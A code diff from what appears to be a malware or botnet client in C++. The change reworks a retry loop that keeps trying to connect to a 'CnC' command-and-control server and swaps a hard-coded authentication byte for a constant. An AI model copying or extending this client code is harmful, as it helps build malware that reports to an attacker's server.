@@ -50,23 +50,24 @@ void Main() {
 	saIn.sin_port = htons(PORT);
 	inet_pton(AF_INET, IP_ADDR, &saIn.sin_addr.s_addr);
 
+	nRes = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));
 	
-	do {
+	while(nRes == SOCKET_ERROR) {
 		nRes = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));
 		std::cout << "[ERROR] Error connecting to the CnC. Trying again in 5 seconds..." << std::endl;
 		Sleep(5000);
-	} while (nRes == SOCKET_ERROR);
+	}
 
 	std::cout << "[SUCCESS] Connected to the CnC. Authenticating..." << std::endl;
 
 	/* AUTHENTICATION STAGE */
-	char auth[] = { 0x01 };
+	char auth[] = { AUTH };
 	send(sock, auth, sizeof(auth), 0);
 
 	char authResp[1024];
 	recv(sock, authResp, sizeof(authResp), 0);
 
-	if (authResp[0] != 0x01) {
+	if (authResp[0] != AUTH) {
 		std::cout << "[ERROR] Invalid response from the CnC" << std::endl;
 		return;
 	}
@@ -76,7 +77,7 @@ void Main() {
 
 	UINT nBuffSize = 0;
 	char authBuff[1024];
-	authBuff[nBuffSize] = 0x01;
+	authBuff[nBuffSize] = AUTH;
 	nBuffSize++;
 	memcpy(&authBuff[nBuffSize], code.data(), code.size());
 	nBuffSize += code.size();
